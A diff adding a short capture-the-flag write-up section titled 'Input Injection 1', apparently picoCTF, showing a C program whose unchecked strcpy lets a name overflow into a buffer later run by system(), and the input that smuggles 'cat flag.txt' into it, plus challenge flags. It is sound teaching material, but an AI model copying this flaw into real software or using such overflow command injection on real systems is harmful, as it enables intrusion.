@@ -202,4 +202,48 @@ YOU WIN
 picoCTF{my_first_heap_overflow_749119de}
 shaunak@Shaunaks-MacBook-Pro ~ %
 ```
-# 
+# Input Injection 1
+We are given a c program
+```
+#include <string.h>
+#include <stdio.h>
+#include <stdlib.h> 
+
+void fun(char *name, char *cmd);
+
+int main() {
+    char name[200];
+    printf("What is your name?\n");
+    fflush(stdout);
+
+
+    fgets(name, sizeof(name), stdin);
+    name[strcspn(name, "\n")] = 0;
+
+    fun(name, "uname");
+    return 0;
+}
+
+void fun(char *name, char *cmd) {
+    char c[10];
+    char buffer[10];
+
+    strcpy(c, cmd);
+    strcpy(buffer, name);
+
+    printf("Goodbye, %s!\n", buffer);
+    fflush(stdout);
+    system(c);
+}
+
+
+```
+here the strcpy function is the culprit, this does not account for the length of the string copied
+so whatever we enter after 10 bytes is overflowing, now we can pass a command to print flag
+```
+What is your name?
+AAAAAAAAAA cat flag.txt
+Goodbye, AAAAAAAAAA cat flag.txt!
+picoCTF{0v3rfl0w_c0mm4nd_a9259e7a}%
+shaunak@Shaunaks-MacBook-Pro ~ % 
+```
